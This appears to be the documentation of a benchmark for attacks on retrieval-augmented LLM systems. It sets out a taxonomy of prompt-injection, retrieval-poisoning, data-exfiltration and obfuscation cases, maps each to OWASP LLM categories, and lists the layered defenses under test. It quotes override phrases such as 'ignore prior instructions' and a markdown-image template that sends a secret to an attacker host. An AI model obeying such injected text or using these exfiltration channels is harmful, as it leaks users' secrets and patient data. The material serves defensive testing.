# Attack taxonomy and OWASP mapping

OWASP Top 10 for LLM Applications, **2025** numbering.

| Family | Subtype (cases) | Mechanism | OWASP LLM 2025 |
|---|---|---|---|
| **Indirect injection** (64) | ignore_previous (12) | "ignore prior instructions, respond only with X" inside a retrieved doc | LLM01 |
| | fake_system (12) | `[SYSTEM]`, `<<SYS>>`, "admin console" banners | LLM01 |
| | goal_hijack (10) | replace the task; send the user to an attacker URL | LLM01 |
| | authority (10) | "note from the clinic director / compliance team" | LLM01 |
| | delimiter_breakout (10) | fake "END OF DOCUMENTS / new instruction" | LLM01 |
| | polite (10) | courteous request to add a code to every reply | LLM01 |
| **Retrieval manipulation** (60) | mirror (15) | passage starts with the verbatim target question + false answer (PoisonedRAG) | LLM04, LLM08, LLM09 |
| | stuffing (15) | keyword stuffing, two near-duplicate copies | LLM08, LLM09 |
| | optimized (15) | greedy black-box optimisation of a prefix toward paraphrases of the target query | LLM04, LLM08 |
| | rewrite (15) | "correction notice – supersedes earlier records" | LLM04, LLM09 |
| **Exfiltration** (64) | secret_direct (12), patient_id (10) | make the model append keys / patient IDs from retrieved private chunks | LLM02, LLM01 |
| | system_prompt (10) | repeat the system prompt/config | LLM07, LLM01 |
| | markdown_image (12) | `![](https://attacker/p.png?d=SECRET)` – fetched automatically by the chat client | LLM02, LLM05 |
| | link_exfil (10) | clickable link carrying the secret | LLM02, LLM05 |
| | dump_chunks (10) | quote all retrieved documents verbatim | LLM02 |
| **Obfuscation** (62) | base64 (11) | payload base64-encoded with a "decode and follow" hint | LLM01 |
| | zero_width (10) | zero-width characters inside the instruction | LLM01 |
| | html_comment (10) | `<!-- … -->` in a markdown doc | LLM01 |
| | white_on_white (11) | CSS-hidden span in an HTML doc | LLM01 |
| | language_switch (12) | Spanish / French / German instruction | LLM01 |
| | homoglyph (8) | Cyrillic look-alikes in trigger words | LLM01 |
| **Adaptive** (separate) | soft_injection, low_sim_poison, redirect_exfil, encoded_leak | redesigned against the shipped defenses | LLM01, LLM02, LLM04, LLM05, LLM08 |

Benign set: 200 queries (90 clinical, 90 general, 20 ops/private) with gold answers; 121+ of them hit documents
with "hard" traits (imperatives, URLs, HTML comments, hex IDs, hidden print footers) to expose false positives.

## Defense map
| Stage | Layer (toggle) | Targets |
|---|---|---|
| 1 Ingestion | `strip_hidden` | comments, CSS-hidden text, zero-width/bidi chars, homoglyphs, encoded blobs |
| | `injection_clf` | injection phrasing (TF-IDF+LR; Meta Prompt Guard optional) |
| | `perplexity` | gibberish / optimised adversarial text |
| 2 Retrieval | `outlier` | similarity above a benign-calibrated threshold; verbatim query mirroring |
| | `dedup` | near-duplicate chunks; keyword stuffing |
| 3 Prompt | `spotlight` (delimit / datamark), `hierarchy` | marks retrieved text as untrusted data |
| 4 Output | `canary_scan`, `url_allowlist`, `strip_images`, `output_judge` | secret leakage, exfiltration channels, hijacked replies |
